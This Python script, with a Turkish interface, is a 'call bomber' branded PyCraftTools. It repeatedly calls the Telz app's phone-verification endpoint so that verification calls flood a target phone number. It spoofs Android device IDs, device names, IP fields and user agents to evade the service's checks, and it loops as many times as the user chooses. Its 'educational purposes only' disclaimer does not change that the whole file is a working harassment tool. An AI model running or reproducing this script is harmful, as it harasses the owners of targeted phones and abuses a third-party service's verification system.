import requests
import json
import time
import uuid
import random
import os
import sys
from datetime import datetime


class Colors:
    
    BLACK = '\033[0;30m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'
    
    BOLD_BLACK = '\033[1;30m'
    BOLD_RED = '\033[1;31m'
    BOLD_GREEN = '\033[1;32m'
    BOLD_YELLOW = '\033[1;33m'
    BOLD_BLUE = '\033[1;34m'
    BOLD_PURPLE = '\033[1;35m'
    BOLD_CYAN = '\033[1;36m'
    BOLD_WHITE = '\033[1;37m'
    
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_PURPLE = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    
    RESET = '\033[0m'
    END = '\033[0m'


def show_banner():
    
    banner = f"""
{Colors.BOLD_CYAN}╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   {Colors.BOLD_YELLOW}██████╗ {Colors.BOLD_GREEN}██╗   ██╗{Colors.BOLD_BLUE} ██████╗{Colors.BOLD_PURPLE}██████╗ {Colors.BOLD_RED} █████╗ {Colors.BOLD_CYAN}███████╗{Colors.RESET}    ║
║   {Colors.BOLD_YELLOW}██╔══██╗{Colors.BOLD_GREEN}╚██╗ ██╔╝{Colors.BOLD_BLUE}██╔════╝{Colors.BOLD_PURPLE}██╔══██╗{Colors.BOLD_RED}██╔══██╗{Colors.BOLD_CYAN}██╔════╝{Colors.RESET}    ║
║   {Colors.BOLD_YELLOW}██████╔╝{Colors.BOLD_GREEN} ╚████╔╝ {Colors.BOLD_BLUE}██║     {Colors.BOLD_PURPLE}██████╔╝{Colors.BOLD_RED}███████║{Colors.BOLD_CYAN}█████╗  {Colors.RESET}    ║
║   {Colors.BOLD_YELLOW}██╔═══╝  {Colors.BOLD_GREEN} ╚██╔╝  {Colors.BOLD_BLUE}██║     {Colors.BOLD_PURPLE}██╔══██╗{Colors.BOLD_RED}██╔══██║{Colors.BOLD_CYAN}██╔══╝  {Colors.RESET}    ║
║   {Colors.BOLD_YELLOW}██║      {Colors.BOLD_GREEN}  ██║   {Colors.BOLD_BLUE}╚██████╗{Colors.BOLD_PURPLE}██║  ██║{Colors.BOLD_RED}██║  ██║{Colors.BOLD_CYAN}██║     {Colors.RESET}    ║
║   {Colors.BOLD_YELLOW}╚═╝      {Colors.BOLD_GREEN}  ╚═╝   {Colors.BOLD_BLUE} ╚═════╝{Colors.BOLD_PURPLE}╚═╝  ╚═╝{Colors.BOLD_RED}╚═╝  ╚═╝{Colors.BOLD_CYAN}╚═╝     {Colors.RESET}    ║
║                                                                           ║
║           {Colors.BOLD_WHITE}🔧 {Colors.BOLD_CYAN}PY CRAFT TOOLS {Colors.BOLD_WHITE}🔧{Colors.RESET}                          ║
║        {Colors.BOLD_GREEN}📞 Telz Call Bomber
{Colors.BOLD_YELLOW}[ Premium ]{Colors.RESET}                    ║
║                                                                           ║
║     {Colors.BOLD_PURPLE}👨‍💻 Developer:{Colors.RESET} kadrbequit                                          ║
║     {Colors.BOLD_BLUE}📱 Telegram:{Colors.RESET} https://t.me/pycrafttools                               ║
║     {Colors.BOLD_RED}🐙 GitHub:{Colors.RESET} https://github.com/kadrbequit                             ║
║     {Colors.BOLD_GREEN}🎮 Discord:{Colors.RESET} kadr217                                                ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


class Caller:
    def __init__(self):
        self.base = "https://api.telz.com/"
        self.session = requests.Session()
        self.android_id = uuid.uuid4().hex[:16]
        self.uuid = str(uuid.uuid4())
        self.user_agents = [
            'Telz-Android/17.5.33',
            'Telz-Android/17.5.32',
            'Telz-Android/17.5.31',
            'Telz-Android/17.4.30',
            'Telz-Android/17.4.29',
            'Telz-Android/17.3.28',
            'Telz-Android/17.3.27',
            'Dalvik/2.1.0 (Linux; U; Android 15; SM-G998B Build/RP1A.200720.012)',
            'Dalvik/2.1.0 (Linux; U; Android 14; SM-S908B Build/UP1A.231005.007)',
            'Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ2A.230505.002)',
            'Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36'
        ]
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
        
    def headers(self):
        return {
            'User-Agent': self.get_random_user_agent(),
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept-Encoding': 'gzip',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
    
    def send(self, endpoint, event, extra=None):
        payload = {
            "event": event,
            "android_id": self.android_id,
            "uuid": self.uuid,
            "ts": int(time.time() * 1000),
            "app_version": "17.5.33",
            "os": "android",
            "os_version": str(random.randint(11, 15))
        }
        if extra:
            payload.update(extra)
        
        try:
            r = self.session.post(
                self.base + endpoint,
                data=json.dumps(payload),
                headers=self.headers(),
                timeout=10
            )
            return r.json()
        except Exception as e:
            return {"error": str(e)}
    
    def ara(self, telefon):
        try:
            self.send("app/auth_list", "auth_list")
            time.sleep(random.uniform(0.3, 0.8))
            
            self.send("app/run", "run", {
                "device_name": f"Xiaomi-{uuid.uuid4().hex[:6]}",
                "ipv4_address": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "ipv6_address": f"FE80::{random.randint(1,9999):x}",
                "lang": "tr",
                "network_country": "tr",
                "network_type": random.choice(["4G", "5G", "WiFi"]),
                "roaming": random.choice(["no", "yes"]),
                "root": "no",
                "run_id": ""
            })
            time.sleep(random.uniform(0.3, 0.8))
            
            self.send("app/stat_btns", "stat_btns", {"btn": "on_reg_continue"})
            time.sleep(random.uniform(0.3, 0.8))
            
            self.send("app/validate_phonenumber", "validate_phonenumber", {
                "phone": telefon,
                "region": "TR"
            })
            time.sleep(random.uniform(0.3, 0.8))
            
            sonuc = self.send("app/auth_call", "auth_call", {
                "phone": telefon,
                "attempt": str(random.randint(0, 3)),
                "lang": "tr",
                "call_id": uuid.uuid4().hex
            })
            
            return sonuc
        except Exception as e:
            return {"error": str(e)}

 
def clear_screen():

    os.system('cls' if os.name == 'nt' else 'clear')

def print_header(text, color=Colors.BOLD_CYAN):

    print(f"\n{color}╔{'═' * 50}╗{Colors.RESET}")
    print(f"{color}║{Colors.RESET} {color}{text.center(48)}{Colors.RESET} {color}║{Colors.RESET}")
    print(f"{color}╚{'═' * 50}╝{Colors.RESET}")

def print_success(text):
    print(f"{Colors.BOLD_GREEN}✅ {text}{Colors.RESET}")

def print_error(text):
    print(f"{Colors.BOLD_RED}❌ {text}{Colors.RESET}")

def print_info(text):
    print(f"{Colors.BOLD_BLUE}ℹ️  {text}{Colors.RESET}")

def print_warning(text):
    print(f"{Colors.BOLD_YELLOW}⚠️  {text}{Colors.RESET}")

def print_progress(text):
    print(f"{Colors.BOLD_PURPLE}🔄 {text}{Colors.RESET}")

def show_about():
    clear_screen()
    about = f"""
{Colors.BOLD_CYAN}╔═══════════════════════════════════════════════════════════════════╗
║                    {Colors.BOLD_YELLOW}ℹ️  HAKKINDA - PY CRAFT TOOLS{Colors.BOLD_CYAN}                     ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  {Colors.BOLD_GREEN}🛠️  Araç:{Colors.RESET} PyCraftTools - Telz Call Bomber                     ║
║                                    ║
║  {Colors.BOLD_PURPLE}👨‍💻  Geliştirici:{Colors.RESET} kadrbequit                                 ║
║  {Colors.BOLD_YELLOW}📅  Tarih:{Colors.RESET} {datetime.now().strftime('%d.%m.%Y %H:%M')}                            ║
║                                                                   ║
║  {Colors.BOLD_CYAN}📌  Açıklama:{Colors.RESET}                                             ║
║  Bu araç, Telz uygulaması üzerinden                             ║
║  call doğrulama göndermek için kullanılır.                       ║
║                                                                   ║
║  {Colors.BOLD_MAGENTA}🔗  Bağlantılar:{Colors.RESET}                                            ║
║  {Colors.BOLD_BLUE}📱 Telegram:{Colors.RESET} https://t.me/pycrafttools                         ║
║  {Colors.BOLD_RED}💻 GitHub:{Colors.RESET} https://github.com/kadrbequit                       ║
║  {Colors.BOLD_GREEN}🎮 Discord:{Colors.RESET} kadr217                                         ║
║                                                                   ║
║  {Colors.BOLD_YELLOW}⚠️  Uyarı:{Colors.RESET}                                               ║
║  Bu araç {Colors.BOLD_RED}sadece eğitim amaçlıdır{Colors.RESET}.                                ║
║  {Colors.BOLD_RED}Kötüye kullanımı yasaktır!{Colors.RESET}                                      ║
║                                                                   ║
║  {Colors.BOLD_GREEN}⭐ Destek:{Colors.RESET}                                              ║
║  Projeyi beğendiyseniz yıldız vermeyi unutmayın! 🌟             ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(about)
    input(f"\n{Colors.BOLD_CYAN}🔙 Ana menüye dönmek için Enter'a basın...{Colors.RESET}")

def countdown(seconds):
    for i in range(seconds, 0, -1):
        print(f"\r{Colors.BOLD_YELLOW}⏳ Bekleniyor... {Colors.BOLD_RED}{i}{Colors.BOLD_YELLOW} saniye kaldı{Colors.RESET}", end="")
        time.sleep(1)
    print(f"\r{Colors.BOLD_GREEN}✅ Bekleme tamamlandı!{' ' * 30}{Colors.RESET}")

def telz_sms_gonder():
    clear_screen()
    show_banner()
    
    print_header("📞 TELZ CALL BOMBER", Colors.BOLD_CYAN)
    
    print(f"\n{Colors.BOLD_WHITE}📱 Telefon Numarası:{Colors.RESET}")
    target = input(f"{Colors.BOLD_CYAN}➜ {Colors.RESET}").strip()
    if not target.startswith("+90"):
        target = "+90" + target.lstrip("0")
    print_success(f"Hedef: {target}")
    
    print(f"\n{Colors.BOLD_WHITE}🔢 Arama Sayısı:{Colors.RESET}")
    try:
        count = int(input(f"{Colors.BOLD_CYAN}➜ {Colors.RESET}"))
        if count <= 0:
            print_error("Sayı 0'dan büyük olmalı!")
            time.sleep(1.5)
            return
    except ValueError:
        print_error("Geçersiz sayı!")
        time.sleep(1.5)
        return
    
    print(f"\n{Colors.BOLD_WHITE}⏱️  Bekleme Süresi (saniye):{Colors.RESET}")
    try:
        wait_time = int(input(f"{Colors.BOLD_CYAN}➜ {Colors.RESET}") or 60)
        if wait_time < 1:
            wait_time = 1
    except ValueError:
        wait_time = 60
    
    print(f"\n{Colors.BOLD_CYAN}╔{'═' * 50}╗{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.BOLD_WHITE}🎯 HEDEF ÖZETİ{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}╠{'═' * 50}╣{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} 📱 Telefon: {Colors.BOLD_GREEN}{target}{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} 🔄 Toplam: {Colors.BOLD_YELLOW}{count}{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} ⏱️  Bekleme: {Colors.BOLD_PURPLE}{wait_time}s{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}╚{'═' * 50}╝{Colors.RESET}")
    
    print(f"\n{Colors.BOLD_YELLOW}⏳ İşlem başlatılıyor...{Colors.RESET}")
    time.sleep(2)
    
    basarili = 0
    basarisiz = 0
    
    for i in range(count):
        c = Caller()
        print_progress(f"[{i+1}/{count}] Arama yapılıyor...")
        
        sonuc = c.ara(target)
        
        if "error" in sonuc:
            print_error(f"Hata: {sonuc['error']}")
            basarisiz += 1
        else:
            if sonuc.get("success", False) or sonuc.get("status") == "success":
                print_success(f"Başarılı! Call ID: {sonuc.get('call_id', 'N/A')}")
                basarili += 1
            else:
                print_warning(f"Sonuç: {json.dumps(sonuc, indent=2, ensure_ascii=False)}")
                basarisiz += 1
        
        if i < count - 1:
            countdown(wait_time)
    
    print(f"\n{Colors.BOLD_CYAN}╔{'═' * 50}╗{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.BOLD_WHITE}📊 İŞLEM RAPORU{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}╠{'═' * 50}╣{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} ✅ Başarılı: {Colors.BOLD_GREEN}{basarili}{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} ❌ Başarısız: {Colors.BOLD_RED}{basarisiz}{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}║{Colors.RESET} 📝 Toplam: {Colors.BOLD_YELLOW}{count}{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}╚{'═' * 50}╝{Colors.RESET}")
    
    input(f"\n{Colors.BOLD_CYAN}🔙 Ana menüye dönmek için Enter'a basın...{Colors.RESET}")

def main_menu():
    while True:
        clear_screen()
        show_banner()
        
        print(f"\n{Colors.BOLD_WHITE}📋 ANA MENÜ{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}╔{'═' * 50}╗{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.BOLD_GREEN}1{Colors.RESET}️⃣  {Colors.BOLD_WHITE}📞 Telz SMS Gönder{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.BOLD_BLUE}2{Colors.RESET}️⃣  {Colors.BOLD_WHITE}ℹ️  Hakkında{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.BOLD_RED}3{Colors.RESET}️⃣  {Colors.BOLD_WHITE}🚪 Çıkış{Colors.RESET}".ljust(52) + f"{Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}╚{'═' * 50}╝{Colors.RESET}")
        
        secim = input(f"\n{Colors.BOLD_YELLOW}👉 Seçiminiz (1-3): {Colors.RESET}").strip()
        
        if secim == "1":
            telz_sms_gonder()
        elif secim == "2":
            show_about()
        elif secim == "3":
            clear_screen()
            print(f"\n{Colors.BOLD_GREEN}👋 Çıkış yapılıyor...{Colors.RESET}")
            print(f"{Colors.BOLD_YELLOW}⭐ PyCraftTools'u kullandığınız için teşekkürler!{Colors.RESET}")
            print(f"{Colors.BOLD_CYAN}🔗 Bizi takip edin: https://t.me/pycrafttools{Colors.RESET}")
            print(f"{Colors.BOLD_PURPLE}🐙 GitHub: https://github.com/kadrbequit{Colors.RESET}")
            time.sleep(2)
            sys.exit(0)
        else:
            print_error("Geçersiz seçim! Lütfen 1-3 arası bir sayı girin.")
            time.sleep(1.5)

if __name__ == "__main__":
    try:
        print(f"{Colors.BOLD_GREEN}🚀 PyCraftTools Başlatılıyor...{Colors.RESET}")
        time.sleep(0.5)
        main_menu()
    except KeyboardInterrupt:
        clear_screen()
        print(f"\n\n{Colors.BOLD_YELLOW}⚠️  Program kullanıcı tarafından durduruldu!{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}🔗 PyCraftTools: https://t.me/pycrafttools{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.BOLD_RED}❌ Beklenmeyen hata: {e}{Colors.RESET}")
        input("Devam etmek için Enter'a basın...")
